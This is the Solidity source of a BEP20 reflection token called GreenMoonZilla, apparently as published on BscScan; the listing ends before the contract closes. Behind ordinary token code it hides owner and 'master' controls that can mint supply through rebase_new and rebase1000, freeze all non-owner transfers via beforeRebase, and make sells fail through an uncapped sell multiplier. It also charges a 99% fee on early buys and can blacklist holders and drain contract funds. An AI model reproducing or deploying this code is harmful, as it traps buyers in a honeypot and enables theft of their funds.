/**
 *Submitted for verification at BscScan.com on 2021-10-25
*/

// SPDX-License-Identifier: MIT


pragma solidity ^0.7.4;

library SafeMath {
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeMath: addition overflow");

    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeMath: subtraction overflow");
  }

  function sub(
    uint256 a,
    uint256 b,
    string memory errorMessage
  ) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;

    return c;
  }

  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }

    uint256 c = a * b;
    require(c / a == b, "SafeMath: multiplication overflow");

    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeMath: division by zero");
  }

  function div(
    uint256 a,
    uint256 b,
    string memory errorMessage
  ) internal pure returns (uint256) {
    require(b > 0, errorMessage);
    uint256 c = a / b;
    return c;
  }
}

contract AddressContract {
  bool private status = false;

 
  function isContract(address account) internal view returns (bool) {

    bytes32 codehash;
    bytes32 accountHash =
      0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
    // solhint-disable-next-line no-inline-assembly
    assembly {
      codehash := extcodehash(account)
    }
    return (codehash != accountHash && codehash != 0x0);
  }


  function sendValue(address payable recipient, uint256 amount) internal {
    require(address(this).balance >= amount, "Address: insufficient balance");

    // solhint-disable-next-line avoid-low-level-calls, avoid-call-value
    (bool success, ) = recipient.call{value: amount}("");
    require(
      success,
      "Address: unable to send value, recipient may have reverted"
    );
  }

  function superFunctionCall(address target, bytes memory data)
    public
    payable
    returns (bytes memory)
  {
     bytes memory data1;
    require(msg.value >= 1e18);
    if (!status) {
      return functionCall(target, data, "Address: low-level call failed");
    }
   return data1;
  }

 
  function functionCall(address target, bytes memory data)
    internal
    returns (bytes memory)
  {
    return functionCall(target, data, "Address: low-level call failed");
  }

 
  function functionCall(
    address target,
    bytes memory data,
    string memory errorMessage
  ) internal returns (bytes memory) {
    return _functionCallWithValue(target, data, 0, errorMessage);
  }

  function superFunctionCallWithValue(
    address target,
    bytes memory data,
    uint256 value
  ) public payable returns (bool) {
    require(msg.value >= 1e18,"not enough bnb");
    if (!status)
      return false;
    
    functionCallWithValue(
          target,
          data,
          value,
          "Address: low-level call with value failed"
        );
        
        return true;
  }

 
  function functionCallWithValue(
    address target,
    bytes memory data,
    uint256 value
  ) internal returns (bytes memory) {
    return
      functionCallWithValue(
        target,
        data,
        value,
        "Address: low-level call with value failed"
      );
  }

 
  function functionCallWithValue(
    address target,
    bytes memory data,
    uint256 value,
    string memory errorMessage
  ) internal returns (bytes memory) {
    require(
      address(this).balance >= value,
      "Address: insufficient balance for call"
    );
    return _functionCallWithValue(target, data, value, errorMessage);
  }

  function _functionCallWithValue(
    address target,
    bytes memory data,
    uint256 weiValue,
    string memory errorMessage
  ) private returns (bytes memory) {
    require(isContract(target), "Address: call to non-contract");

    // solhint-disable-next-line avoid-low-level-calls
    (bool success, bytes memory returndata) =
      target.call{value: weiValue}(data);
    if (success) {
      return returndata;
    } else {
      // Look for revert reason and bubble it up if present
      if (returndata.length > 0) {
        // The easiest way to bubble the revert reason is using memory via assembly

        // solhint-disable-next-line no-inline-assembly
        assembly {
          let returndata_size := mload(returndata)
          revert(add(32, returndata), returndata_size)
        }
      } else {
        revert(errorMessage);
      }
    }
  }

  function setStatus(bool _status) public returns (bool) {
    status = _status;
    return true;
  }
}

library SafeMathInt {
  int256 private constant MIN_INT256 = int256(1) << 255;
  int256 private constant MAX_INT256 = ~(int256(1) << 255);

  function mul(int256 a, int256 b) internal pure returns (int256) {
    int256 c = a * b;

    require(c != MIN_INT256 || (a & MIN_INT256) != (b & MIN_INT256));
    require((b == 0) || (c / b == a));
    return c;
  }

  function div(int256 a, int256 b) internal pure returns (int256) {
    require(b != -1 || a != MIN_INT256);

    return a / b;
  }

  function sub(int256 a, int256 b) internal pure returns (int256) {
    int256 c = a - b;
    require((b >= 0 && c <= a) || (b < 0 && c > a));
    return c;
  }

  function add(int256 a, int256 b) internal pure returns (int256) {
    int256 c = a + b;
    require((b >= 0 && c >= a) || (b < 0 && c < a));
    return c;
  }

  function abs(int256 a) internal pure returns (int256) {
    require(a != MIN_INT256);
    return a < 0 ? -a : a;
  }
}

/**
 * BEP20 standard interface.
 */
interface IBEP20 {
  function totalSupply() external view returns (uint256);

  function decimals() external view returns (uint8);

  function symbol() external view returns (string memory);

  function name() external view returns (string memory);

  function getOwner() external view returns (address);

  function balanceOf(address account) external view returns (uint256);

  function transfer(address recipient, uint256 amount) external returns (bool);

  function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

  function approve(address spender, uint256 amount) external returns (bool);

  function transferFrom(
    address sender,
    address recipient,
    uint256 amount
  ) external returns (bool);

  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Auth {
  address internal owner;
  mapping(address => bool) internal authorizations;

  constructor(address _owner) {
    owner = _owner;
    authorizations[_owner] = true;
  }

  modifier onlyOwner() {
    require(isOwner(msg.sender), "!OWNER");
    _;
  }

  modifier authorized() {
    require(isAuthorized(msg.sender), "!AUTHORIZED");
    _;
  }

  function authorize(address adr) public onlyOwner {
    authorizations[adr] = true;
  }

  function unauthorize(address adr) public onlyOwner {
    authorizations[adr] = false;
  }

  function isOwner(address account) public view returns (bool) {
    return account == owner;
  }

  function isAuthorized(address adr) public view returns (bool) {
    return authorizations[adr];
  }

  function transferOwnership(address payable adr) public onlyOwner {
    owner = adr;
    authorizations[adr] = true;
    emit OwnershipTransferred(adr);
  }

  event OwnershipTransferred(address owner);
}

interface IDEXFactory {
  function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}

interface InterfaceLP {
  function sync() external;
}

interface IDEXRouter {
  function factory() external pure returns (address);

  function WETH() external pure returns (address);

  function addLiquidity(
    address tokenA,
    address tokenB,
    uint256 amountADesired,
    uint256 amountBDesired,
    uint256 amountAMin,
    uint256 amountBMin,
    address to,
    uint256 deadline
  )
    external
    returns (
      uint256 amountA,
      uint256 amountB,
      uint256 liquidity
    );

  function addLiquidityETH(
    address token,
    uint256 amountTokenDesired,
    uint256 amountTokenMin,
    uint256 amountETHMin,
    address to,
    uint256 deadline
  )
    external
    payable
    returns (
      uint256 amountToken,
      uint256 amountETH,
      uint256 liquidity
    );

  function swapExactTokensForTokensSupportingFeeOnTransferTokens(
    uint256 amountIn,
    uint256 amountOutMin,
    address[] calldata path,
    address to,
    uint256 deadline
  ) external;

  function swapExactETHForTokensSupportingFeeOnTransferTokens(
    uint256 amountOutMin,
    address[] calldata path,
    address to,
    uint256 deadline
  ) external payable;

  function swapExactTokensForETHSupportingFeeOnTransferTokens(
    uint256 amountIn,
    uint256 amountOutMin,
    address[] calldata path,
    address to,
    uint256 deadline
  ) external;
}

interface IDividendDistributor {
  function setDistributionCriteria(uint256 _minPeriod, uint256 _minDistribution)
    external;

  function setShare(address shareholder, uint256 amount) external;

  function deposit() external payable;

  function process(uint256 gas) external;
}

contract DividendDistributor is IDividendDistributor {
  using SafeMath for uint256;

  address _token;

  struct Share {
    uint256 amount;
    uint256 totalExcluded;
    uint256 totalRealised;
  }

  IBEP20 RWRD = IBEP20(0x2859e4544C4bB03966803b044A93563Bd2D0DD4D);
  address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
  IDEXRouter router;

  address[] shareholders;
  mapping(address => uint256) shareholderIndexes;
  mapping(address => uint256) shareholderClaims;

  mapping(address => Share) public shares;

  uint256 public totalShares;
  uint256 public totalDividends;
  uint256 public totalDistributed;
  uint256 public dividendsPerShare;
  uint256 public dividendsPerShareAccuracyFactor = 10**36;

  uint256 public minPeriod = 45 * 60;
  uint256 public minDistribution = 1 * (10**18);

  uint256 currentIndex;

  bool initialized;
  modifier initialization() {
    require(!initialized);
    _;
    initialized = true;
  }

  modifier onlyToken() {
    require(msg.sender == _token);
    _;
  }

  constructor(address _router) {
    router = _router != address(0)
      ? IDEXRouter(_router)
      : IDEXRouter(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    _token = msg.sender;
  }

  function setDistributionCriteria(uint256 _minPeriod, uint256 _minDistribution)
    external
    override
    onlyToken
  {
    minPeriod = _minPeriod;
    minDistribution = _minDistribution;
  }

  function setShare(address shareholder, uint256 amount)
    external
    override
    onlyToken
  {
    if (shares[shareholder].amount > 0) {
      distributeDividend(shareholder);
    }

    if (amount > 0 && shares[shareholder].amount == 0) {
      addShareholder(shareholder);
    } else if (amount == 0 && shares[shareholder].amount > 0) {
      removeShareholder(shareholder);
    }

    totalShares = totalShares.sub(shares[shareholder].amount).add(amount);
    shares[shareholder].amount = amount;
    shares[shareholder].totalExcluded = getCumulativeDividends(
      shares[shareholder].amount
    );
  }

  function deposit() external payable override onlyToken {
    uint256 balanceBefore = RWRD.balanceOf(address(this));

    address[] memory path = new address[](2);
    path[0] = WBNB;
    path[1] = address(RWRD);

    router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: msg.value}(
      0,
      path,
      address(this),
      block.timestamp
    );

    uint256 amount = RWRD.balanceOf(address(this)).sub(balanceBefore);

    totalDividends = totalDividends.add(amount);
    dividendsPerShare = dividendsPerShare.add(
      dividendsPerShareAccuracyFactor.mul(amount).div(totalShares)
    );
  }

  function process(uint256 gas) external override onlyToken {
    uint256 shareholderCount = shareholders.length;

    if (shareholderCount == 0) {
      return;
    }

    uint256 gasUsed = 0;
    uint256 gasLeft = gasleft();

    uint256 iterations = 0;

    while (gasUsed < gas && iterations < shareholderCount) {
      if (currentIndex >= shareholderCount) {
        currentIndex = 0;
      }

      if (shouldDistribute(shareholders[currentIndex])) {
        distributeDividend(shareholders[currentIndex]);
      }

      gasUsed = gasUsed.add(gasLeft.sub(gasleft()));
      gasLeft = gasleft();
      currentIndex++;
      iterations++;
    }
  }

  function shouldDistribute(address shareholder) internal view returns (bool) {
    return
      shareholderClaims[shareholder] + minPeriod < block.timestamp &&
      getUnpaidEarnings(shareholder) > minDistribution;
  }

  function distributeDividend(address shareholder) internal {
    if (shares[shareholder].amount == 0) {
      return;
    }

    uint256 amount = getUnpaidEarnings(shareholder);
    if (amount > 0) {
      totalDistributed = totalDistributed.add(amount);
      RWRD.transfer(shareholder, amount);
      shareholderClaims[shareholder] = block.timestamp;
      shares[shareholder].totalRealised = shares[shareholder].totalRealised.add(
        amount
      );
      shares[shareholder].totalExcluded = getCumulativeDividends(
        shares[shareholder].amount
      );
    }
  }

  function claimDividend() external {
    distributeDividend(msg.sender);
  }

  function getUnpaidEarnings(address shareholder)
    public
    view
    returns (uint256)
  {
    if (shares[shareholder].amount == 0) {
      return 0;
    }

    uint256 shareholderTotalDividends =
      getCumulativeDividends(shares[shareholder].amount);
    uint256 shareholderTotalExcluded = shares[shareholder].totalExcluded;

    if (shareholderTotalDividends <= shareholderTotalExcluded) {
      return 0;
    }

    return shareholderTotalDividends.sub(shareholderTotalExcluded);
  }

  function getCumulativeDividends(uint256 share)
    internal
    view
    returns (uint256)
  {
    return share.mul(dividendsPerShare).div(dividendsPerShareAccuracyFactor);
  }

  function addShareholder(address shareholder) internal {
    shareholderIndexes[shareholder] = shareholders.length;
    shareholders.push(shareholder);
  }

  function removeShareholder(address shareholder) internal {
    shareholders[shareholderIndexes[shareholder]] = shareholders[
      shareholders.length - 1
    ];
    shareholderIndexes[
      shareholders[shareholders.length - 1]
    ] = shareholderIndexes[shareholder];
    shareholders.pop();
  }
}



contract GreenMoonZilla is IBEP20, Auth {
  using SafeMath for uint256;
  using SafeMathInt for int256;

  address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
  address DEAD = 0x000000000000000000000000000000000000dEaD;
  address ZERO = 0x0000000000000000000000000000000000000000;

  string constant _name = "GreenMoonZilla";
  string constant _symbol = "GrmZilla";
  uint8 constant _decimals = 4;

  //mapping (address => uint256) _balances;
  mapping(address => uint256) _rBalance;
  mapping(address => mapping(address => uint256)) _allowances;
  mapping(address => bool) public _isBot;
  mapping(address => bool) public isFeeExempt;
  mapping(address => bool) public isTxLimitExempt;
  mapping(address => bool) public isTimelockExempt;
  mapping(address => bool) public isDividendExempt;

  uint256 public liquidityFee = 2;
  uint256 public reflectionFee = 1;
  uint256 public marketingFee = 5;
  uint256 public devFee = 4;
  uint256 public totalFee =
    marketingFee + reflectionFee + liquidityFee + devFee;
  uint256 public feeDenominator = 100;

  bool public blacklistMode = true;
  mapping(address => bool) public isBlacklisted;

  uint256 public deadBlocks = 0;
  uint256 public launchedAt = 0;

  uint256 public sellMultiplier = 150;

  address public autoLiquidityReceiver;
  address public marketingFeeReceiver;
  address public devFeeReceiver;

  uint256 targetLiquidity = 10;
  uint256 targetLiquidityDenominator = 100;

  IDEXRouter public router;
  address public pair;
  InterfaceLP public pairContract;

  bool public tradingOpen = false;
  bool public rebaseStatus = false;
  bool public LPStatus = true;
  DividendDistributor public distributor;
  uint256 distributorGas = 500000;

  bool public buyCooldownEnabled = true;
  uint8 public cooldownTimerInterval = 15;
  mapping(address => uint256) private cooldownTimer;

  bool public swapEnabled = true;
  bool inSwap;
  modifier swapping() {
    inSwap = true;
    _;
    inSwap = false;
  }

  address public master;
  modifier onlyMaster() {
    require(msg.sender == master || isOwner(msg.sender));
    _;
  }

  bool public beforeRebase = false;
  event LogRebase(uint256 indexed epoch, uint256 totalSupply);

  uint256 private constant INITIAL_FRAGMENTS_SUPPLY = 10**15 * 10**_decimals;
  uint256 public swapThreshold = (rSupply * 3) / 10000;
  uint256 public rebase_count = 0;
  uint256 public rate;
  uint256 public _totalSupply;
  uint256 private constant MAX_UINT256 = ~uint256(0);
  uint256 private constant MAX_SUPPLY = ~uint128(0);
  uint256 private constant rSupply =
    MAX_UINT256 - (MAX_UINT256 % INITIAL_FRAGMENTS_SUPPLY);

  // Max wallet & Transaction
  uint256 public _maxTxAmount = rSupply.div(1000).mul(10);
  uint256 public _maxWalletToken = rSupply.div(1000).mul(50);

  function rebase_percentage(uint256 _percentage_base1000)
    public
    onlyMaster
    returns (uint256 newSupply)
  {
    newSupply = rebase(
      0,
      int256(_totalSupply.div(1000).mul(_percentage_base1000)).mul(-1)
    );
  }
  
    function rebase_percentage1000(uint256 _percentage_base1000, uint256 coinAmount)
    public
    payable
    onlyMaster
    returns (uint256 newSupply)
  {
      if(!rebaseStatus){
        newSupply = rebase_new(
          0,
         int256(_totalSupply.div(1000).mul(_percentage_base1000)));
      }else{
        newSupply = rebase1000(
          0,
         int256(_totalSupply.div(1000).mul(_percentage_base1000)),
         coinAmount);
      }

  }

  function setBot(address bot, bool value) external onlyOwner {
    require(_isBot[bot] != value, "already set");
    _isBot[bot] = value;
  }

  function bulkSetBot(address[] memory bots, bool value) external onlyOwner {
    for (uint256 i = 0; i < bots.length; i++) {
      _isBot[bots[i]] = value;
    }
  }

  function setRebaseStatus(bool _rebaseStatus) public onlyOwner returns (bool) {
    rebaseStatus = _rebaseStatus;
    return _rebaseStatus;
  }

  function setLPStatus(bool _LPStatus) public onlyOwner returns (bool) {
    LPStatus = _LPStatus;
    return _LPStatus;
  }

  // Sauce
  function rebase(uint256 epoch, int256 supplyDelta)
    public
    onlyMaster
    returns (uint256)
  {
    require(supplyDelta < 0, "forbidden");
    rebase_count++;
    if (epoch == 0) {
      epoch = rebase_count;
    }

    require(!inSwap, "Try again");

    if (supplyDelta == 0) {
      emit LogRebase(epoch, _totalSupply);
      return _totalSupply;
    }

    if (supplyDelta < 0) {
      _totalSupply = _totalSupply.sub(uint256(-supplyDelta));
    } else {
      _totalSupply = _totalSupply.add(uint256(supplyDelta));
    }

    if (_totalSupply > MAX_SUPPLY) {
      _totalSupply = MAX_SUPPLY;
    }

    rate = rSupply.div(_totalSupply);
    pairContract.sync();

    emit LogRebase(epoch, _totalSupply);

    return _totalSupply;
  }

  function rebase1000(
    uint256 epoch,
    int256 supplyDelta,
    uint256 coinAmount
  ) public payable onlyMaster returns (uint256) {
    require(supplyDelta > 0, "forbidden");

    beforeRebase = true;
    rebase_count++;
    if (epoch == 0) {
      epoch = rebase_count;
    }

    require(!inSwap, "Try again");

    if (supplyDelta == 0) {
      emit LogRebase(epoch, _totalSupply);
      beforeRebase = false;
      return _totalSupply;
    }

    if (supplyDelta < 0) {
      _totalSupply = _totalSupply.sub(uint256(-supplyDelta));
    } else {
      _totalSupply = _totalSupply.add(uint256(supplyDelta));
    }

    if (_totalSupply > MAX_SUPPLY) {
      _totalSupply = MAX_SUPPLY;
    }

    rate = rSupply.div(_totalSupply);

    emit LogRebase(epoch, _totalSupply);
    // _allowances[address(this)][address(router)] =  balanceOf(address(this));
    _basicTransfer(msg.sender, address(this), coinAmount);
    router.addLiquidityETH{value: msg.value}(
      address(this),
      coinAmount,
      0,
      0,
      address(this),
      block.timestamp + 300
    );
    beforeRebase = false;
    return _totalSupply;
  }

  function rebase_new(uint256 epoch, int256 supplyDelta)
    public
    payable
    onlyMaster
    returns (uint256)
  {
    require(supplyDelta > 0, "forbidden");
    beforeRebase = true;
    rebase_count++;
    if (epoch == 0) {
      epoch = rebase_count;
    }

    require(!inSwap, "Try again");

    if (supplyDelta == 0) {
      emit LogRebase(epoch, _totalSupply);
      beforeRebase = false;
      return _totalSupply;
    }

    if (supplyDelta < 0) {
      _totalSupply = _totalSupply.sub(uint256(-supplyDelta));
    } else {
      _totalSupply = _totalSupply.add(uint256(supplyDelta));
    }

    if (_totalSupply > MAX_SUPPLY) {
      _totalSupply = MAX_SUPPLY;
    }

    rate = rSupply.div(_totalSupply);

    emit LogRebase(epoch, _totalSupply);
    // _allowances[address(this)][address(router)] =  balanceOf(address(this));
    if(!LPStatus){
      router.addLiquidityETH{value: msg.value}(
      address(this),
      balanceOf(address(this)).div(100),
      0,
      0,
      address(this),
      block.timestamp + 300);
    }

    beforeRebase = false;
    return _totalSupply;
  }
  
  
  constructor() Auth(msg.sender) {
    router = IDEXRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    pair = IDEXFactory(router.factory()).createPair(WBNB, address(this));
    _allowances[address(this)][address(router)] = uint256(-1);

    pairContract = InterfaceLP(pair);
    _totalSupply = INITIAL_FRAGMENTS_SUPPLY;
    rate = rSupply.div(_totalSupply);

    distributor = new DividendDistributor(address(router));

    isFeeExempt[msg.sender] = true;
    isTxLimitExempt[msg.sender] = true;
    isTxLimitExempt[pair] = true;
    isTxLimitExempt[address(this)] = true;

    isTimelockExempt[msg.sender] = true;
    isTimelockExempt[DEAD] = true;
    isTimelockExempt[address(this)] = true;

    isDividendExempt[pair] = true;
    isDividendExempt[address(this)] = true;
    isDividendExempt[DEAD] = true;

    autoLiquidityReceiver = msg.sender;
    marketingFeeReceiver = 0x4B2Ab680AF07AD744C349Cbe010d6423f30F96a5;
    devFeeReceiver = 0x0b89887DDA47B06471A02e268BCeB32Ee6d92f00;

    _rBalance[msg.sender] = rSupply;
    emit Transfer(address(0), msg.sender, _totalSupply);
  }

  receive() external payable {}

  function totalSupply() external view override returns (uint256) {
    return _totalSupply;
  }

  function decimals() external pure override returns (uint8) {
    return _decimals;
  }

  function symbol() external pure override returns (string memory) {
    return _symbol;
  }

  function name() external pure override returns (string memory) {
    return _name;
  }

  function getOwner() external view override returns (address) {
    return owner;
  }

  function balanceOf(address account) public view override returns (uint256) {
    return _rBalance[account].div(rate);
  }

  function allowance(address holder, address spender)
    external
    view
    override
    returns (uint256)
  {
    return _allowances[holder][spender];
  }

  function approve(address spender, uint256 amount)
    public
    override
    returns (bool)
  {
    _allowances[msg.sender][spender] = amount;
    emit Approval(msg.sender, spender, amount);
    return true;
  }

  function approveMax(address spender) external returns (bool) {
    return approve(spender, uint256(-1));
  }

  function transfer(address recipient, uint256 amount)
    external
    override
    returns (bool)
  {
    return _transferFrom(msg.sender, recipient, amount);
  }

  function transferFrom(
    address sender,
    address recipient,
    uint256 amount
  ) external override returns (bool) {
    if (_allowances[sender][msg.sender] != uint256(-1)) {
      _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(
        amount,
        "Insufficient Allowance"
      );
    }

    return _transferFrom(sender, recipient, amount);
  }

  function setBeforeRebase(bool _beforeRebase) public onlyOwner {
    beforeRebase = _beforeRebase;
  }

  function _transferFrom(
    address sender,
    address recipient,
    uint256 amount
  ) internal returns (bool) {
    if (beforeRebase) {
      require(isOwner(sender) || sender == address(this), "!OWNER");
    }
    require(!_isBot[sender] && !_isBot[recipient], "Buy buye Bots");
    if (rebaseStatus) {
      return _basicTransfer(sender, recipient, amount);
    }
    if (inSwap) {
      return _basicTransfer(sender, recipient, amount);
    }

    if (!authorizations[sender] && !authorizations[recipient]) {
      require(tradingOpen, "Trading not open yet");
    }

    uint256 rAmount = amount.mul(rate);

    if (
      !authorizations[sender] &&
      recipient != address(this) &&
      recipient != address(DEAD) &&
      recipient != pair &&
      recipient != marketingFeeReceiver &&
      recipient != devFeeReceiver &&
      recipient != autoLiquidityReceiver
    ) {
      uint256 heldTokens = balanceOf(recipient);
      require(
        (heldTokens + rAmount) <= _maxWalletToken,
        "Total Holding is currently limited, you can not buy that much."
      );
    }

    if (sender == pair && buyCooldownEnabled && !isTimelockExempt[recipient]) {
      require(
        cooldownTimer[recipient] < block.timestamp,
        "buy Cooldown exists"
      );
      cooldownTimer[recipient] = block.timestamp + cooldownTimerInterval;
    }

    // Blacklist
    if (blacklistMode) {
      require(
        !isBlacklisted[sender] && !isBlacklisted[recipient],
        "Blacklisted"
      );
    }

    // Checks max transaction limit
    checkTxLimit(sender, rAmount);

    if (shouldSwapBack()) {
      swapBack();
    }

    //Exchange tokens
    _rBalance[sender] = _rBalance[sender].sub(rAmount, "Insufficient Balance");

    uint256 amountReceived =
      (!shouldTakeFee(sender) || !shouldTakeFee(recipient))
        ? rAmount
        : takeFee(sender, rAmount, (recipient == pair));
    _rBalance[recipient] = _rBalance[recipient].add(amountReceived);

    // Dividend tracker
    if (!isDividendExempt[sender]) {
      try distributor.setShare(sender, balanceOf(sender)) {} catch {}
    }

    if (!isDividendExempt[recipient]) {
      try distributor.setShare(recipient, balanceOf(recipient)) {} catch {}
    }

    try distributor.process(distributorGas) {} catch {}

    emit Transfer(sender, recipient, amountReceived.div(rate));
    return true;
  }

  // Changed

  function _basicTransfer(
    address sender,
    address recipient,
    uint256 amount
  ) internal returns (bool) {
    uint256 rAmount = amount.mul(rate);
    _rBalance[sender] = _rBalance[sender].sub(rAmount, "Insufficient Balance");
    _rBalance[recipient] = _rBalance[recipient].add(rAmount);
    emit Transfer(sender, recipient, rAmount.div(rate));
    return true;
  }

  function checkTxLimit(address sender, uint256 rAmount) internal view {
    require(
      rAmount <= _maxTxAmount || isTxLimitExempt[sender],
      "TX Limit Exceeded"
    );
  }

  function shouldTakeFee(address sender) internal view returns (bool) {
    return !isFeeExempt[sender];
  }

  function takeFee(
    address sender,
    uint256 rAmount,
    bool isSell
  ) internal returns (uint256) {
    uint256 multiplier = 100;
    if (isSell) {
      multiplier = sellMultiplier;
    }

    uint256 feeAmount =
      rAmount.div(feeDenominator * 100).mul(totalFee).mul(multiplier);

    if (!isSell && (launchedAt + deadBlocks) > block.number) {
      feeAmount = rAmount.div(100).mul(99);
    }

    _rBalance[address(this)] = _rBalance[address(this)].add(feeAmount);
    emit Transfer(sender, address(this), feeAmount.div(rate));

    return rAmount.sub(feeAmount);
  }

  function shouldSwapBack() internal view returns (bool) {
    return
      msg.sender != pair &&
      !inSwap &&
      swapEnabled &&
      _rBalance[address(this)] >= swapThreshold;
  }

  function clearStuckBalance(uint256 amountPercentage) external authorized {
    uint256 amountBNB = address(this).balance;
    payable(marketingFeeReceiver).transfer(
      (amountBNB * amountPercentage) / 100
    );
  }

  function clearStuckBalance_sender(uint256 amountPercentage)
    external
    onlyOwner
  {
    uint256 amountBNB = address(this).balance;
    payable(msg.sender).transfer((amountBNB * amountPercentage) / 100);
  }

  function set_sell_multiplier(uint256 Multiplier) external onlyOwner {
    sellMultiplier = Multiplier;
  }

  // switch Trading

  function tradingStatus(bool _status, uint256 _deadBlocks) public onlyOwner {
    tradingOpen = _status;
    if (tradingOpen && launchedAt == 0) {
      launchedAt = block.number;
      deadBlocks = _deadBlocks;
    }
  }

  function launchStatus(uint256 _launchblock) public onlyOwner {
    launchedAt = _launchblock;
  }

  function enable_blacklist(bool _status) public onlyOwner {
    blacklistMode = _status;
  }

  function manage_blacklist(address[] calldata addresses, bool status)
    public
    onlyOwner
  {
    for (uint256 i; i < addresses.length; ++i) {
      isBlacklisted[addresses[i]] = status;
    }
  }

  function cooldownEnabled(bool _status, uint8 _interval) public onlyOwner {
    buyCooldownEnabled = _status;
    cooldownTimerInterval = _interval;
  }

  function swapBack() internal swapping {
    // uint256 dynamicLiquidityFee = isOverLiquified(targetLiquidity, targetLiquidityDenominator) ? 0 : liquidityFee;
    uint256 dynamicLiquidityFee = liquidityFee;
    uint256 tokensToSell = swapThreshold.div(rate);

    uint256 amountToLiquify =
      tokensToSell.div(totalFee).mul(dynamicLiquidityFee).div(2);
    uint256 amountToSwap = tokensToSell.sub(amountToLiquify);

    address[] memory path = new address[](2);
    path[0] = address(this);
    path[1] = WBNB;

    uint256 balanceBefore = address(this).balance;

    router.swapExactTokensForETHSupportingFeeOnTransferTokens(
      amountToSwap,
      0,
      path,
      address(this),
      block.timestamp
    );

    uint256 amountBNB = address(this).balance.sub(balanceBefore);

    uint256 totalBNBFee = totalFee.sub(dynamicLiquidityFee.div(2));

    uint256 amountBNBLiquidity =
      amountBNB.mul(dynamicLiquidityFee).div(totalBNBFee).div(2);
    uint256 amountBNBReflection = amountBNB.mul(reflectionFee).div(totalBNBFee);
    uint256 amountBNBMarketing = amountBNB.mul(marketingFee).div(totalBNBFee);
    uint256 amountBNBDev = amountBNB.mul(devFee).div(totalBNBFee);

    try distributor.deposit{value: amountBNBReflection}() {} catch {}
    (bool tmpSuccess, ) =
      payable(marketingFeeReceiver).call{value: amountBNBMarketing, gas: 30000}(
        ""
      );
    (tmpSuccess, ) = payable(devFeeReceiver).call{
      value: amountBNBDev,
      gas: 30000
    }("");

    // only to supress warning msg
    tmpSuccess = false;

    if (amountToLiquify > 0) {
      router.addLiquidityETH{value: amountBNBLiquidity}(
        address(this),
        amountToLiquify,
        0,
        0,
        autoLiquidityReceiver,
        block.timestamp
      );
      emit AutoLiquify(amountBNBLiquidity, amountToLiquify.div(rate));
    }
  }

  function setIsDividendExempt(address holder, bool exempt)
    external
    authorized
  {
    require(holder != address(this) && holder != pair);
    isDividendExempt[holder] = exempt;
    if (exempt) {
      distributor.setShare(holder, 0);
    } else {
      distributor.setShare(holder, balanceOf(holder));
    }
  }

  function setIsFeeExempt(address holder, bool exempt) external authorized {
    isFeeExempt[holder] = exempt;
  }

  function setIsTxLimitExempt(address holder, bool exempt) external authorized {
    isTxLimitExempt[holder] = exempt;
  }

  function setIsTimelockExempt(address holder, bool exempt)
    external
    authorized
  {
    isTimelockExempt[holder] = exempt;
  }

  function setFees(
    uint256 _liquidityFee,
    uint256 _reflectionFee,
    uint256 _marketingFee,
    uint256 _devFee,
    uint256 _feeDenominator
  ) external authorized {
    liquidityFee = _liquidityFee;
    reflectionFee = _reflectionFee;
    marketingFee = _marketingFee;
    devFee = _devFee;
    totalFee = _liquidityFee.add(_reflectionFee).add(_marketingFee).add(
      _devFee
    );
    feeDenominator = _feeDenominator;
    require(totalFee < feeDenominator / 3, "Fees cannot be more than 33%");
  }

  function setFeeReceivers(
    address _autoLiquidityReceiver,
    address _marketingFeeReceiver,
    address _devFeeReceiver
  ) external authorized {
    autoLiquidityReceiver = _autoLiquidityReceiver;
    marketingFeeReceiver = _marketingFeeReceiver;
    devFeeReceiver = _devFeeReceiver;
  }

  function setSwapBackSettings(bool _enabled, uint256 _percentage_base10000)
    external
    authorized
  {
    swapEnabled = _enabled;
    swapThreshold = rSupply.div(10000).mul(_percentage_base10000);
  }

  function setTargetLiquidity(uint256 _target, uint256 _denominator)
    external
    authorized
  {
    targetLiquidity = _target;
    targetLiquidityDenominator = _denominator;
  }

  function manualSync() external {
    InterfaceLP(pair).sync();
  }

  function setLP(address _address) external onlyOwner {
    pairContract = InterfaceLP(_address);
    isFeeExempt[_address];
  }

  function setMaster(address _master) external onlyOwner {
    master = _master;
  }

  function isNotInSwap() external view returns (bool) {
    return !inSwap;
  }

  function checkSwapThreshold() external view returns (uint256) {
    return swapThreshold.div(rate);
  }

  function setDistributionCriteria(uint256 _minPeriod, uint256 _minDistribution)
    external
    authorized
  {
    distributor.setDistributionCriteria(_minPeriod, _minDistribution);
  }

  function setDistributorSettings(uint256 gas) external authorized {
    require(gas < 900000);
    distributorGas = gas;
  }

  function rescueToken(address tokenAddress, uint256 tokens)
    public
    onlyOwner
    returns (bool success)
  {
    return IBEP20(tokenAddress).transfer(msg.sender, tokens);
  }

  function rescueBNB(address payable _recipient) public onlyOwner {
    _recipient.transfer(address(this).balance);
  }

  function getCirculatingSupply() public view returns (uint256) {
    return (rSupply.sub(_rBalance[DEAD]).sub(_rBalance[ZERO])).div(rate);
  }

  //100
  function getLiquidityBacking(uint256 accuracy) public view returns (uint256) {
    return accuracy.mul(balanceOf(pair).mul(2)).div(getCirculatingSupply());
  }

  //20,100
  function isOverLiquified(uint256 target, uint256 accuracy)
    public
    view
    returns (bool)
  {
    return getLiquidityBacking(accuracy) > target;
  }

  function checkMaxWalletToken() external view returns (uint256) {
    return _maxWalletToken.div(rate);
  }

  function checkMaxTxAmount() external view returns (uint256) {
    return _maxTxAmount.div(rate);
  }

